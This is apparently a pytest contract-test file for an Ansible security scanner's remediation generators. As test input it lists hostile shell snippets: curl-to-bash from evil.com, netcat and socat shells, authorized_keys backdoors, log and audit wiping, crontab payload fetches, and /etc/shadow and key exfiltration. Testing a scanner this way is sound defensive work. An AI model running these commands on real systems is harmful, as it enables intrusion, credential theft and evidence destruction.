"""Contract tests for the remediation generators.

Every shipped rule must produce a well-formed, rule-specific
remediation, and every rule that isn't explicitly procedural must carry
a Secure Fix YAML block. Run with `pytest tests/test_remediations.py`.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parent.parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from ansible_security_scanner.remediations import _pattern_index as _PI  # noqa: E402
from ansible_security_scanner.remediations.insecure_communication import (  # noqa: E402
    InsecureCommunicationRemediationGenerator,
)
from ansible_security_scanner.remediations.malicious_activity import (  # noqa: E402
    MaliciousActivityRemediationGenerator,
)
from ansible_security_scanner.remediations.operational_security import (  # noqa: E402
    OperationalSecurityRemediationGenerator,
)
from ansible_security_scanner.remediations.privilege_escalation import (  # noqa: E402
    PrivilegeEscalationRemediationGenerator,
)
from ansible_security_scanner.remediations.remediation_generator import (  # noqa: E402
    RemediationGenerator,
)
from ansible_security_scanner.remediations.system_compromise import (  # noqa: E402
    SystemCompromiseRemediationGenerator,
)
from ansible_security_scanner.remediations.template_injection import (  # noqa: E402
    TemplateInjectionRemediationGenerator,
)

PATTERNS_DIR = SRC / "ansible_security_scanner" / "patterns"


def _collect_rule_ids() -> list[tuple[str, str]]:
    """Return a list of (rule_id, category) tuples from every pattern YAML file."""
    out: list[tuple[str, str]] = []
    for yml in sorted(PATTERNS_DIR.glob("*.yml")):
        data = yaml.safe_load(yml.read_text())
        if not isinstance(data, dict):
            continue
        patterns = data.get("patterns", [])
        for p in patterns:
            rid = p.get("id")
            cat = p.get("category", yml.stem)
            if rid:
                out.append((rid, cat))
    return out


ALL_RULES = _collect_rule_ids()


_UNRENDERED_PLACEHOLDER_PATTERNS = [
    re.compile(r"\{code_snippet[^a-zA-Z0-9_]"),
    re.compile(r"\{rule_id[^a-zA-Z0-9_]"),
]

# `{ ident }` / `{ ident | filter }`: the symptom of an f-string author
# writing `{{ x }}` where Jinja needs literal `{{ x }}` (i.e. `{{{{ x }}}}`).
_SINGLE_BRACE_JINJA_RE = re.compile(
    r"(?<!\{)\{ [a-zA-Z_][a-zA-Z0-9_.]*(?:\s*\|\s*[^{}]+?)? \}(?!\})"
)

# `{{ key: val }}` around a YAML mapping: copy-paste from an f-string
# body that doubled the braces to escape them. Never valid Jinja.
_DOUBLED_BRACES_AROUND_MAPPING_RE = re.compile(r"\{\{\s*[a-zA-Z_][\w-]*\s*:\s*[^{}\n]+\}\}")

# Substrings that mean a render pipeline failed (template not interpolated,
# Python repr leaked, internal class identifier reached the user).
_RENDER_FAILURE_MARKERS = (
    "_BASELINE_POD_SPEC",
    "{self.",
    "{cls.",
    "<class '",
    "<function ",
)

# Structural-YAML line shapes used to detect runs of YAML that escape
# every fenced block. We deliberately do not match prose bullets like
# `- PyPI: Account Settings`.
_YAML_TOPLEVEL_KEY_RE = re.compile(r"^[a-z_][\w-]*:\s*$")
_YAML_INDENTED_KEY_RE = re.compile(r"^ {2,}[a-z_][\w-]*:\s*\S")
_YAML_LIST_ITEM_RE = re.compile(r"^ {2,}- [a-z_][\w-]*:\s*\S")
_MARKDOWN_BULLET_RE = re.compile(r"^[ ]{0,2}- [A-Z]")

# Triple-fenced blocks; allow up to 4 spaces of leading indent on either
# fence so we also strip the indented fences the MR comment renderer
# emits for inline snippets.
_FENCED_BLOCK_RE = re.compile(r"^[ ]{0,4}```[^\n]*\n.*?\n[ ]{0,4}```", re.DOTALL | re.MULTILINE)


def _unfenced_yaml_runs(output: str) -> list[list[str]]:
    """Return runs (>= 2 lines) of structural-YAML-shaped lines that
    survive outside every ```...``` block. Single yaml-looking lines
    are tolerated; it's the multi-line blocks that misrender as prose.
    """
    stripped = _FENCED_BLOCK_RE.sub("", output)

    runs: list[list[str]] = []
    current: list[str] = []
    for raw_line in stripped.splitlines():
        if _MARKDOWN_BULLET_RE.match(raw_line):
            # Markdown bullet at column 0 - not YAML even if it has a colon.
            if len(current) >= 2:
                runs.append(current)
            current = []
            continue
        if (
            _YAML_TOPLEVEL_KEY_RE.match(raw_line)
            or _YAML_INDENTED_KEY_RE.match(raw_line)
            or _YAML_LIST_ITEM_RE.match(raw_line)
        ):
            current.append(raw_line)
            continue
        if current and not raw_line.strip():
            # Blank line continues a yaml block.
            current.append(raw_line)
            continue
        if len(current) >= 2:
            runs.append(current)
        current = []
    if len(current) >= 2:
        runs.append(current)
    return runs


def _assert_well_formed(rule_id: str, output: str) -> None:
    assert isinstance(output, str), f"{rule_id}: non-string output"
    assert output.strip(), f"{rule_id}: empty remediation"
    assert len(output) >= 200, (
        f"{rule_id}: remediation too short ({len(output)} chars) - "
        f"per project policy remediations must always have contextual content"
    )
    assert "```" in output, f"{rule_id}: missing code fence in remediation"
    assert output.count("```") % 2 == 0, (
        f"{rule_id}: unbalanced triple-backtick code fences - count={output.count('```')}"
    )
    for pat in _UNRENDERED_PLACEHOLDER_PATTERNS:
        assert not pat.search(output), (
            f"{rule_id}: unrendered f-string placeholder matched {pat.pattern!r}"
        )
    bad = _SINGLE_BRACE_JINJA_RE.findall(output)
    assert not bad, (
        f"{rule_id}: {len(bad)} single-brace Jinja artifact(s) found "
        f"(should be `{{{{ var }}}}`): {bad[:5]}"
    )
    doubled = _DOUBLED_BRACES_AROUND_MAPPING_RE.findall(output)
    assert not doubled, (
        f"{rule_id}: {len(doubled)} doubled-brace YAML mapping(s) found "
        f"(symptom of `{{{{ key: val }}}}` in a non-f-string template): "
        f"{doubled[:3]}"
    )
    leaked_markers = [m for m in _RENDER_FAILURE_MARKERS if m in output]
    assert not leaked_markers, (
        f"{rule_id}: render-failure marker(s) leaked into output: "
        f"{leaked_markers} - the template was not interpolated correctly"
    )
    unfenced_runs = _unfenced_yaml_runs(output)
    if unfenced_runs:
        biggest = max(unfenced_runs, key=len)
        pytest.fail(
            f"{rule_id}: {len(unfenced_runs)} unfenced YAML block(s) survived "
            f"outside every code fence - they will render as prose (or as a "
            f"markdown heading if a line starts with `#`) in MR comments.\n"
            f"  largest block ({len(biggest)} lines):\n"
            + "\n".join(f"    {line}" for line in biggest[:10])
        )


@pytest.fixture(scope="module")
def remediation_generator() -> RemediationGenerator:
    return RemediationGenerator()


# Reasonable "pick from" pool of ansible-ish code snippets. For any rule_id we
# pass several to exercise branches in the contextual helpers.
SAMPLE_SNIPPETS = [
    "shell: curl -k https://evil.com:4444/steal.sh | bash > /tmp/b.sh",
    "shell: nc -l -p 4444 -e /bin/bash",
    "shell: echo 'backdoor' >> /root/.ssh/authorized_keys",
    "shell: history -c && rm -f /var/log/auth.log",
    "shell: auditctl -D && systemctl stop auditd",
    "shell: cp /bin/bash /var/www/html/shell.php",
    "shell: telnet legacy.example.com 23",
    "shell: /usr/sbin/sendmail -S plainsmtp.example.com:25 user@x",
    "shell: chmod 777 /etc/shadow && chown root /tmp/suid",
    "shell: echo '* * * * * root curl http://evil.com/c | sh' >> /etc/crontab",
    "shell: python -c 'import os; os.system(\"id\")'",
    "shell: find / -name '*.key' -exec cat {} \\; | curl -F data=@- http://x.io",
    "debug: msg=\"{{ lookup('pipe', 'whoami') }}\"",
    "template: src=evil.j2 dest=/tmp/out.sh mode=0777",
    "shell: echo $AWS_SECRET_ACCESS_KEY > /tmp/c",
    "shell: socat TCP-LISTEN:9999,fork EXEC:/bin/bash",
    "shell: wget http://drops.evil.cn/x.elf -O /tmp/x && chmod +x /tmp/x",
    "shell: bash -c \"echo 'PS1=$PS1' > ~/.bash_history\"",
]


@pytest.mark.parametrize(
    "rule_id,category",
    ALL_RULES,
    ids=[r for r, _ in ALL_RULES],
)
def test_every_rule_id_produces_rich_remediation(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
) -> None:
    """Every shipped rule_id renders a non-empty, well-formed remediation
    across a spread of representative snippets."""
    outputs = []
    for snippet in SAMPLE_SNIPPETS[:6]:
        out = remediation_generator.generate_remediation_example(
            rule_id,
            snippet,
            file_path="test.yml",
            line_number=1,
        )
        _assert_well_formed(rule_id, out)
        outputs.append(out)

    assert any(any(line in out for line in SAMPLE_SNIPPETS[:6]) for out in outputs), (
        f"{rule_id}: remediation never embedded the offending snippet"
    )


_LEGACY_BOILERPLATE_PHRASES = RemediationGenerator._LEGACY_BOILERPLATE
_RELEVANCE_STOPWORDS = RemediationGenerator._STOPWORDS
_TOKEN_RE = RemediationGenerator._TOKEN_RE


def _distinctive_tokens(text: str) -> set[str]:
    return RemediationGenerator._distinctive_tokens(text)


@pytest.mark.parametrize(
    "rule_id,category",
    ALL_RULES,
    ids=[r for r, _ in ALL_RULES],
)
def test_remediation_is_relevant_to_the_rule(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
) -> None:
    """Each rule's remediation must mention a distinctive token from its
    own ``title``/``recommendation`` and must not regress to the legacy
    category-level boilerplate."""
    yml = PATTERNS_DIR / f"{category}.yml"
    if yml.exists():
        data = yaml.safe_load(yml.read_text()) or {}
        meta = next((p for p in data.get("patterns", []) if p.get("id") == rule_id), None)
    else:
        meta = None
        for candidate in PATTERNS_DIR.glob("*.yml"):
            data = yaml.safe_load(candidate.read_text()) or {}
            for p in data.get("patterns", []):
                if p.get("id") == rule_id:
                    meta = p
                    break
            if meta:
                break

    assert meta is not None, f"{rule_id}: no pattern metadata found"
    title = meta.get("title") or ""
    recommendation = meta.get("recommendation") or ""

    keywords = _distinctive_tokens(title) | _distinctive_tokens(recommendation)
    if not keywords:
        pytest.skip(f"{rule_id}: rule has no title/recommendation tokens to anchor against")

    snippet = "shell: echo placeholder"
    out = remediation_generator.generate_remediation_example(
        rule_id, snippet, file_path="test.yml", line_number=1
    )
    out_lower = out.lower()

    leaked = [p for p in _LEGACY_BOILERPLATE_PHRASES if p in out]
    assert not leaked, (
        f"{rule_id}: remediation emitted legacy boilerplate phrase {leaked[0]!r} - "
        f"this rule is regressing to the pre-metadata fallback."
    )

    matched = [k for k in keywords if k in out_lower]
    assert matched, (
        f"{rule_id}: remediation does not mention any distinctive token from "
        f"the rule's title/recommendation.\n"
        f"  title: {title!r}\n"
        f"  recommendation excerpt: {recommendation[:160]!r}\n"
        f"  remediation excerpt (first 240 chars): {out[:240]!r}\n"
        f"  expected at least one of (sample): {sorted(keywords)[:8]}"
    )


_SECURE_FIX_BLOCK_RE = re.compile(
    r"\*\*\u2705[^*\n]+:\*\*\s*\n(?:[^\n]*\n){0,3}```ya?ml\n",
    re.MULTILINE,
)


@pytest.mark.parametrize(
    "rule_id,category",
    ALL_RULES,
    ids=[r for r, _ in ALL_RULES],
)
def test_remediation_includes_secure_fix_yaml_block(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
) -> None:
    """Every rule must carry a concrete ``✅ Secure Fix`` YAML block, or
    set ``no_ansible_remediation: true`` if the correct response is
    procedural rather than configurable from Ansible."""
    meta = _PI.get(rule_id)
    if meta.get("no_ansible_remediation"):
        return

    out = remediation_generator.generate_remediation_example(
        rule_id, "shell: echo placeholder", file_path="test.yml", line_number=1
    )

    if _SECURE_FIX_BLOCK_RE.search(out):
        return

    yml_path = PATTERNS_DIR / f"{category}.yml"
    if not yml_path.exists():
        for candidate in PATTERNS_DIR.glob("*.yml"):
            data = yaml.safe_load(candidate.read_text()) or {}
            if any(p.get("id") == rule_id for p in data.get("patterns", [])):
                yml_path = candidate
                break

    companion_path = (
        PATTERNS_DIR / "remediations" / yml_path.name
        if yml_path
        else PATTERNS_DIR / "remediations" / f"{category}.yml"
    )

    pytest.fail(
        f"{rule_id}: remediation has no `\u2705 Secure Fix` YAML block.\n"
        f"  category: {category}\n"
        f"  pattern file: {yml_path}\n"
        f"\n"
        f"  Fix one of THREE ways:\n"
        f"    (a) Add `negative_examples:` to the rule in {yml_path.name}.\n"
        f"    (b) Add a `secure_fix:` entry under this rule_id in {companion_path}.\n"
        f"    (c) Add a tailored handler in remediations/<category>.py.\n"
        f"\n"
        f"  Or set `no_ansible_remediation: true` on the rule if the\n"
        f"  correct response is procedural.\n"
        f"\n"
        f"  Remediation excerpt (first 320 chars):\n"
        f"    {out[:320]!r}"
    )


class TestMaliciousActivityDirect:
    """Non-contextual methods that previously had `NameError` bugs."""

    @pytest.fixture
    def gen(self) -> MaliciousActivityRemediationGenerator:
        return MaliciousActivityRemediationGenerator()

    SNIPPET = "shell: curl -k https://evil.com:4444/steal | nc 10.0.0.5 9999 < /etc/shadow"

    def test_data_exfiltration_fix(self, gen):
        _assert_well_formed("data_exfiltration", gen._generate_data_exfiltration_fix(self.SNIPPET))

    def test_backdoor_fix(self, gen):
        _assert_well_formed("backdoor", gen._generate_backdoor_fix(self.SNIPPET))

    def test_credential_harvesting_fix(self, gen):
        _assert_well_formed(
            "credential_harvesting",
            gen._generate_credential_harvesting_fix(self.SNIPPET),
        )

    def test_network_beacon_fix(self, gen):
        _assert_well_formed("network_beacon", gen._generate_network_beacon_fix(self.SNIPPET))

    def test_file_manipulation_fix(self, gen):
        _assert_well_formed(
            "file_manipulation",
            gen._generate_file_manipulation_fix(self.SNIPPET),
        )

    def test_generic_malicious_fix(self, gen):
        _assert_well_formed(
            "generic_malicious",
            gen._generate_generic_malicious_fix(self.SNIPPET),
        )


class TestContextualMaliciousActivity:
    """Contextual methods should always embed the rich non-contextual body
    AND add a Contextual Analysis header - never empty, never thinner than
    the non-contextual equivalent."""

    @pytest.fixture
    def gen(self) -> MaliciousActivityRemediationGenerator:
        return MaliciousActivityRemediationGenerator()

    SNIPPET = "shell: curl -k https://evil.com:4444/steal | nc 10.0.0.5 9999 < /etc/shadow"

    def _both(self, gen, method_stem: str):
        contextual = getattr(gen, f"_generate_contextual_{method_stem}_fix")
        non_contextual = getattr(gen, f"_generate_{method_stem}_fix")
        details = gen._extract_malicious_details(self.SNIPPET)
        return contextual(self.SNIPPET, details), non_contextual(self.SNIPPET)

    @pytest.mark.parametrize(
        "stem",
        [
            "data_exfiltration",
            "backdoor",
            "credential_harvesting",
            "network_beacon",
            "file_manipulation",
            "generic_malicious",
        ],
    )
    def test_contextual_is_at_least_as_rich(self, gen, stem):
        ctx, base = self._both(gen, stem)
        _assert_well_formed(f"contextual_{stem}", ctx)
        assert "Contextual Analysis" in ctx, f"contextual_{stem} missing Contextual Analysis header"
        assert len(ctx) >= len(base), (
            f"contextual_{stem} is thinner than non-contextual baseline ({len(ctx)} vs {len(base)})"
        )


class TestExtractMaliciousDetails:
    """The extractor underpins every contextual fix - exercise its branches."""

    @pytest.fixture
    def gen(self) -> MaliciousActivityRemediationGenerator:
        return MaliciousActivityRemediationGenerator()

    def test_extracts_urls_hosts_files_ports(self, gen):
        d = gen._extract_malicious_details(
            "curl -k https://evil.com:8080/steal | base64 | bash > /tmp/backdoor.sh"
        )
        assert "https://evil.com:8080/steal" in d["urls"]
        assert "evil.com" in d["domains"]
        assert "evil.com" in d["hosts"]
        assert "8080" in d["ports"]
        assert "/tmp/backdoor.sh" in d["files"]

    def test_extracts_ipv4(self, gen):
        d = gen._extract_malicious_details("nc 10.0.0.5 4444 < /etc/passwd")
        assert "10.0.0.5" in d["ips"]
        assert "10.0.0.5" in d["hosts"]
        assert "4444" in d["ports"]
        assert "/etc/passwd" in d["files"]

    def test_extracts_env_variables(self, gen):
        d = gen._extract_malicious_details("echo $AWS_SECRET_ACCESS_KEY > /tmp/c")
        assert "AWS_SECRET_ACCESS_KEY" in d["variables"]

    def test_deterministic_ordering(self, gen):
        # insertion-order dedupe must be stable
        snippet = "curl https://a.com; curl https://b.com; curl https://a.com"
        d1 = gen._extract_malicious_details(snippet)
        d2 = gen._extract_malicious_details(snippet)
        assert d1 == d2
        assert d1["hosts"] == ["a.com", "b.com"]


@pytest.mark.parametrize(
    "cls,method,rule_id,snippet",
    [
        (
            SystemCompromiseRemediationGenerator,
            "_generate_history_manipulation_fix",
            "bash_history_tampering",
            "shell: history -c && HISTFILE=/dev/null",
        ),
        (
            SystemCompromiseRemediationGenerator,
            "_generate_log_tampering_fix",
            "audit_log_tampering",
            "shell: rm -f /var/log/auth.log && auditctl -D",
        ),
        (
            SystemCompromiseRemediationGenerator,
            "_generate_backdoor_listener_fix",
            "backdoor_listener",
            "shell: nc -lvp 4444 -e /bin/bash",
        ),
        (
            SystemCompromiseRemediationGenerator,
            "_generate_web_shell_fix",
            "web_shell_drop",
            "shell: cp /bin/bash /var/www/html/shell.php",
        ),
        (
            PrivilegeEscalationRemediationGenerator,
            "_generate_cron_abuse_fix",
            "cron_privilege_abuse",
            "shell: echo '* * * * * root curl http://evil/|sh' >> /etc/crontab",
        ),
        (
            PrivilegeEscalationRemediationGenerator,
            "_generate_service_abuse_fix",
            "service_privilege_abuse",
            "shell: systemctl edit --full evil.service",
        ),
        (
            PrivilegeEscalationRemediationGenerator,
            "_generate_file_permissions_fix",
            "dangerous_world_writable",
            "file: path=/etc/shadow mode=0777",
        ),
        (
            TemplateInjectionRemediationGenerator,
            "_generate_command_substitution_fix",
            "template_command_substitution",
            "debug: msg=\"{{ lookup('pipe', 'id') }}\"",
        ),
        (
            InsecureCommunicationRemediationGenerator,
            "_generate_telnet_fix",
            "telnet_usage",
            "shell: telnet legacy.example.com 23",
        ),
        (
            InsecureCommunicationRemediationGenerator,
            "_generate_email_fix",
            "plaintext_smtp",
            "shell: /usr/sbin/sendmail -S plainsmtp.example.com:25 u@x",
        ),
    ],
)
def test_previously_dead_methods_render_cleanly(cls, method, rule_id, snippet):
    """Each of these methods previously had `NameError` bugs from single-brace
    Jinja2 inside f-strings, or was simply never reachable. They must now
    render cleanly end-to-end."""
    gen = cls()
    out = getattr(gen, method)(snippet)
    _assert_well_formed(rule_id, out)


class TestOperationalSecurityDelegation:
    @pytest.fixture
    def gen(self) -> OperationalSecurityRemediationGenerator:
        return OperationalSecurityRemediationGenerator()

    @pytest.mark.parametrize(
        "rule_id,snippet",
        [
            ("history_file_tampering", "shell: history -c"),
            ("audit_log_tampering", "shell: auditctl -D"),
            ("log_file_deletion", "shell: rm /var/log/auth.log"),
            ("journal_log_flush", "shell: journalctl --rotate --vacuum-time=1s"),
            ("utmp_wtmp_tamper", "shell: > /var/log/wtmp"),
            ("timestomping", "shell: touch -d '2000-01-01' /bin/ls"),
        ],
    )
    def test_log_tamper_rules_delegate_to_rich_templates(self, gen, rule_id, snippet):
        """The log-tamper family now delegates to the rich SystemCompromise
        templates instead of the old 4-line stub."""
        out = gen.generate_operational_security_fix(rule_id, snippet)
        _assert_well_formed(rule_id, out)
        assert len(out) >= 800, (
            f"{rule_id}: expected rich delegated template, got only {len(out)} chars"
        )


class TestRuleIdCategoryCoverage:
    """The authoritative rule_id -> category mapping lives in
    ``rule_id_categories.yml``. Every shipped pattern must have an explicit
    entry - if this test fails, the scanner is silently falling back to the
    keyword heuristic for the listed rule_ids, which usually means a new
    pattern was added without updating the YAML.
    """

    def test_every_shipped_rule_id_has_an_explicit_category(self):
        from ansible_security_scanner.patterns_manager import patterns_manager
        from ansible_security_scanner.remediations._category_map import (
            _RULE_ID_TO_CATEGORY,
        )

        pdata = patterns_manager.discover_and_load_patterns()
        shipped_ids = {p.id for v in pdata.values() for p in v}
        missing = sorted(shipped_ids - set(_RULE_ID_TO_CATEGORY.keys()))
        assert not missing, (
            f"{len(missing)} shipped rule_id(s) are missing from "
            "rule_id_categories.yml: "
            + ", ".join(missing[:10])
            + ("..." if len(missing) > 10 else "")
        )

    def test_yaml_categories_stay_in_sync_with_resolver(self):
        """Sanity: the resolver must return what the YAML says for an
        arbitrary sample - guards against a broken loader."""
        from ansible_security_scanner.remediations._category_map import (
            _RULE_ID_TO_CATEGORY,
            resolve_category,
        )

        for rid, cat in list(_RULE_ID_TO_CATEGORY.items())[:25]:
            assert resolve_category(rid) == cat, (
                f"resolver disagrees with YAML for {rid}: "
                f"resolver={resolve_category(rid)!r}, yaml={cat!r}"
            )


class TestTaintFlowRealWorldSyntax:
    """The taint-flow remediation renders a Vulnerable + Secure example per
    sink module. This locks in that each example uses ONLY argument keys
    that exist in the real Ansible module schema - catching the class of
    regression where an earlier implementation emitted a `cmd:` block under
    `ansible.builtin.uri` (`uri` has no `cmd:` argument) or a hardcoded
    `"do-something"` placeholder with no real syntax at all.
    """

    from ansible_security_scanner.remediations.taint_flow import (
        TaintFlowRemediationGenerator,
    )

    _VALID_ARGS = {
        "shell": {"shell", "chdir", "creates", "executable", "removes", "stdin"},
        "raw": {"raw", "executable"},
        "command": {"command", "argv", "chdir", "creates", "removes", "cmd", "stdin"},
        "script": {"script", "cmd", "chdir", "creates", "removes", "executable"},
        "uri": {
            "url",
            "method",
            "body",
            "body_format",
            "headers",
            "validate_certs",
            "status_code",
            "timeout",
            "return_content",
            "user",
            "password",
            "force_basic_auth",
            "ca_path",
            "client_cert",
            "client_key",
        },
        "get_url": {
            "url",
            "dest",
            "mode",
            "owner",
            "group",
            "checksum",
            "validate_certs",
            "headers",
            "timeout",
            "force",
            "backup",
            "ca_path",
        },
        "template": {"src", "dest", "mode", "owner", "group", "backup", "validate"},
        "copy": {
            "src",
            "content",
            "dest",
            "mode",
            "owner",
            "group",
            "backup",
            "validate",
            "directory_mode",
        },
    }

    _SINK_MODULE_FQN = {
        "shell": "ansible.builtin.shell",
        "raw": "ansible.builtin.raw",
        "command": "ansible.builtin.command",
        "script": "ansible.builtin.script",
        "uri": "ansible.builtin.uri",
        "get_url": "ansible.builtin.get_url",
        "template": "ansible.builtin.template",
        "copy": "ansible.builtin.copy",
    }

    _SECURE_BLOCK_RE = re.compile(
        r"\*\*[\u2705].*?Secure.*?\*\*\s*```yaml\s*\n(?P<body>.*?)```",
        re.DOTALL,
    )
    _VULN_BLOCK_RE = re.compile(
        r"\*\*[\u274c].*?Vulnerable.*?\*\*\s*```yaml\s*\n(?P<body>.*?)```",
        re.DOTALL,
    )
    _MODULE_HEADER_RE = re.compile(r"^-\s+(?:ansible\.builtin\.)?(\w+):")
    _ARG_KEY_RE = re.compile(r"^\s{4}([a-z_]+):")

    @pytest.fixture
    def gen(self):
        return self.TaintFlowRemediationGenerator()

    @pytest.mark.parametrize("sink", sorted(_VALID_ARGS.keys()))
    def test_secure_block_uses_only_real_module_args(self, gen, sink):
        fqn = self._SINK_MODULE_FQN[sink]
        out = gen.generate_taint_flow_fix(
            rule_id="cross_file_taint",
            code_snippet="{{ some_var }}",
            sink_module=fqn,
            var_name="some_var",
        )
        _assert_well_formed(f"cross_file_taint:{sink}", out)

        secure_match = self._SECURE_BLOCK_RE.search(out)
        assert secure_match, f"{sink}: no Secure block found in remediation"
        secure_body = secure_match.group("body")

        declared_sink, module_block = self._last_module_block(secure_body)
        assert declared_sink in self._VALID_ARGS, (
            f"{sink}: Secure block uses an unknown sink module `{declared_sink}`"
        )

        used_args = set(self._ARG_KEY_RE.findall(module_block))
        invalid = used_args - self._VALID_ARGS[declared_sink]
        assert not invalid, (
            f"{sink}: Secure block uses argument(s) {sorted(invalid)!r} "
            f"that are not valid for `{declared_sink}`. "
            f"Valid args: {sorted(self._VALID_ARGS[declared_sink])!r}"
        )

    @pytest.mark.parametrize("sink", sorted(_VALID_ARGS.keys()))
    def test_vulnerable_block_uses_only_real_module_args(self, gen, sink):
        fqn = self._SINK_MODULE_FQN[sink]
        out = gen.generate_taint_flow_fix(
            rule_id="cross_file_taint",
            code_snippet="{{ some_var }}",
            sink_module=fqn,
            var_name="some_var",
        )

        vuln_match = self._VULN_BLOCK_RE.search(out)
        assert vuln_match, f"{sink}: no Vulnerable block found"
        declared_sink, module_block = self._last_module_block(vuln_match.group("body"))
        assert declared_sink in self._VALID_ARGS, (
            f"{sink}: Vulnerable block uses an unknown sink module `{declared_sink}`"
        )
        used_args = set(self._ARG_KEY_RE.findall(module_block))
        invalid = used_args - self._VALID_ARGS[declared_sink]
        assert not invalid, (
            f"{sink}: Vulnerable block uses argument(s) {sorted(invalid)!r} "
            f"not valid for `{declared_sink}`"
        )

    @classmethod
    def _last_module_block(cls, yaml_body: str) -> tuple[str, str]:
        """Split ``yaml_body`` on top-level ``- `` list markers and return
        ``(sink_name, block_body)`` for the LAST list entry whose header
        names one of the sinks under test. The taint-flow remediation
        always puts the sink as the final task after ``- set_fact: ...``.
        """
        chunks = re.split(r"\n(?=-\s+)", "\n" + yaml_body.lstrip("\n"))
        for chunk in reversed(chunks):
            m = cls._MODULE_HEADER_RE.search(chunk.lstrip("\n"))
            if not m:
                continue
            name = m.group(1)
            if name in cls._VALID_ARGS:
                return name, chunk
        raise AssertionError(f"no sink module header found in:\n{yaml_body!r}")

    def test_uri_secure_block_has_no_cmd_argv_block(self, gen):
        """Regression guard for the `ansible.builtin.uri` + `cmd:`/argv bug."""
        out = gen.generate_taint_flow_fix(
            rule_id="cross_file_taint",
            code_snippet="{{ user_input }}",
            sink_module="ansible.builtin.uri",
            var_name="user_input",
        )
        assert "cmd:" not in out, (
            "uri sink must not render `cmd:` - that key does not exist on "
            "the ansible.builtin.uri module"
        )
        assert "argv:" not in out, (
            "uri sink must not render `argv:` - that key does not exist on "
            "the ansible.builtin.uri module"
        )
        assert "url:" in out, "uri sink must render a real `url:` argument"

    def test_no_placeholder_strings_survive(self, gen):
        """Regression guard for the `"do-something ..."` hardcoded placeholder
        that earlier versions emitted for every non-shell sink."""
        for sink, fqn in self._SINK_MODULE_FQN.items():
            out = gen.generate_taint_flow_fix(
                rule_id="cross_file_taint",
                code_snippet="{{ some_var }}",
                sink_module=fqn,
                var_name="some_var",
            )
            assert "do-something" not in out, (
                f"{sink}: placeholder `do-something` leaked into remediation"
            )
            assert "your_" not in out, f"{sink}: placeholder `your_*` leaked into remediation"

    def test_main_dispatcher_routes_cross_file_taint(self):
        """End-to-end: the shared RemediationGenerator must dispatch
        `cross_file_taint` findings to the TaintFlowRemediationGenerator
        (not the generic fallback), so every taint finding in the wild
        produces a module-aware remediation."""
        main = RemediationGenerator()
        out = main.generate_remediation_example(
            rule_id="cross_file_taint",
            code_snippet="{{ tainted }}",
        )
        _assert_well_formed("cross_file_taint:dispatcher", out)
        # The generic fallback hardcodes this phrase; its presence means the
        # dispatcher failed to find the taint-flow generator.
        assert "General Security Best Practices" not in out, (
            "cross_file_taint hit the generic fallback - the dispatcher "
            "entry for `cross_file_taint` is missing or broken"
        )
